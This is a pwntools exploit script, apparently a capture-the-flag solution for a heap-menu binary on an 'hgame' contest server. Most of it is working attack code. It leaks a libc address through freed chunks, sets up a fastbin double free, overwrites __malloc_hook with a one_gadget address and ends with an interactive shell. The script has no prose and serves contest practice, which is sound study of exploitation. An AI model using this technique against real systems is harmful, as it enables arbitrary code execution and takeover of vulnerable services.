from pwn import *
import time

context.log_level = 'debug'

debug = False

elf = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 32348)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP("/lib/x86_64-linux-gnu/libc.so.6")


def add(idx, size, content):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(idx))
    io.sendlineafter(b"Size: ", str(size))
    io.sendlineafter(b"Content: ", content)


def delete(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(idx))


def show(idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(idx))

for i in range(7):
	add(i, 0xd0, b"abc")

add(7, 0xd0, b"abc")
add(8, 0x60, b"abc")
for i in range(8):
	delete(i)
	
show(7)
libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))
libc.address = libcmain_offset - 0x1ecbe0
success("libc address -> " + hex(libc.address))
_malloc_hook_address = libc.symbols["__malloc_hook"]
success("malloc_hook -> " + hex(_malloc_hook_address))
realloc_address = libc.sym['realloc']
success("_realloc_address -> " + hex(realloc_address))
success("system -> " + hex(libc.symbols["system"]))
one = libc.address + 0xe3b01

for i in range(7):
	add(i, 0x60, b"abc")
add(7, 0x60, "abc")
add(8, 0x60, "abc")
add(9, 0x60, "abc")

for i in range(7):
	delete(i)
delete(7)
delete(8)
delete(7)

for i in range(7):
	add(i, 0x60, b"abc")
add(7, 0x60, p64(_malloc_hook_address))
add(8, 0x60, p64(0))
add(9, 0x60, p64(0))
add(7, 0x60, p64(one))
io.sendlineafter(b">", b"1")
#ddebug()
io.sendlineafter(b"Index: ", b'8')
io.sendlineafter(b"Size: ", str(0x60).encode())

io.interactive()
